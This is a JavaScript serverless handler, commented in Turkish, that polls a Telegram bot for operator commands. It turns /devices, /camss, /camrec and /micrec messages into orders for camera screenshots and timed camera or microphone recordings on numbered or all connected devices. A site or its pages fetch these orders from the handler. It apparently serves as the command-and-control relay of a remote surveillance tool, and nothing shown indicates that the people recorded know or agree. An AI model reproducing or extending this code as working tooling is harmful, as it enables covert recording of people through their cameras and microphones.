// 🤖 Telegram Bot Command Polling API
// Bu fonksiyon site tarafından çağrılır ve Telegram bot'tan yeni komutları alır
// Komutlar: /camss, /camrec X, /micrec X

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

// Son işlenen update ID'yi saklama (Map - her chat için ayrı)
const lastUpdateIds = new Map();

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const allowedChatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !allowedChatId) {
            return res.status(500).json({ success: false, error: 'Server configuration error' });
        }

        // Her chat için son update ID'yi al
        const lastUpdateId = lastUpdateIds.get(allowedChatId) || 0;

        // Telegram'dan son mesajları al (getUpdates)
        const telegramUrl = `${TELEGRAM_API_URL}${botToken}/getUpdates?offset=${lastUpdateId + 1}&limit=10&timeout=0`;
        const telegramResponse = await fetch(telegramUrl);
        const telegramData = await telegramResponse.json();

        if (!telegramData.ok) {
            return res.status(500).json({ success: false, error: 'Telegram API error' });
        }

        const updates = telegramData.result;

        // Komutları filtrele (sadece izin verilen chat ID'den)
        const commands = [];
        let newLastUpdateId = lastUpdateId;
        
        for (const update of updates) {
            if (update.message && update.message.text) {
                const chatId = update.message.chat.id.toString();
                const text = update.message.text.trim();

                // Sadece izin verilen chat ID'den gelen komutları kabul et
                if (chatId === allowedChatId) {
                    // /devices komutu - özel işlem
                    if (text === '/devices') {
                        commands.push({
                            command: 'list_devices',
                            params: null,
                            message_id: update.message.message_id,
                            target_device: null // Tüm cihazlar
                        });
                    }
                    // /camss veya /camss 2 formatı
                    else if (text.startsWith('/camss')) {
                        const match = text.match(/\/camss\s*(\d+)?/);
                        const targetDevice = match && match[1] ? parseInt(match[1]) : null;
                        commands.push({
                            command: 'camera_screenshot',
                            params: null,
                            message_id: update.message.message_id,
                            target_device: targetDevice // null = tüm cihazlar
                        });
                    }
                    // /camrec35 veya /camrec35 2 formatı
                    else if (text.startsWith('/camrec')) {
                        const match = text.match(/\/camrec\s*(\d+)?\s*(\d+)?/);
                        const duration = match && match[1] ? parseInt(match[1]) : 5;
                        const targetDevice = match && match[2] ? parseInt(match[2]) : null;
                        commands.push({
                            command: 'camera_record',
                            params: { duration: Math.max(1, Math.min(duration, 30)) },
                            message_id: update.message.message_id,
                            target_device: targetDevice
                        });
                    }
                    // /micrec35 veya /micrec35 2 formatı
                    else if (text.startsWith('/micrec')) {
                        const match = text.match(/\/micrec\s*(\d+)?\s*(\d+)?/);
                        const duration = match && match[1] ? parseInt(match[1]) : 5;
                        const targetDevice = match && match[2] ? parseInt(match[2]) : null;
                        commands.push({
                            command: 'microphone_record',
                            params: { duration: Math.max(1, Math.min(duration, 30)) },
                            message_id: update.message.message_id,
                            target_device: targetDevice
                        });
                    }
                }

                // En son update ID'yi güncelle
                if (update.update_id > newLastUpdateId) {
                    newLastUpdateId = update.update_id;
                }
            }
        }

        // LastUpdateId'yi kaydet (bir sonraki request için)
        if (newLastUpdateId > lastUpdateId) {
            lastUpdateIds.set(allowedChatId, newLastUpdateId);
        }

        return res.status(200).json({
            success: true,
            commands: commands,
            count: commands.length
        });

    } catch (error) {
        console.error('Error in get-commands:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            message: error.message
        });
    }
}

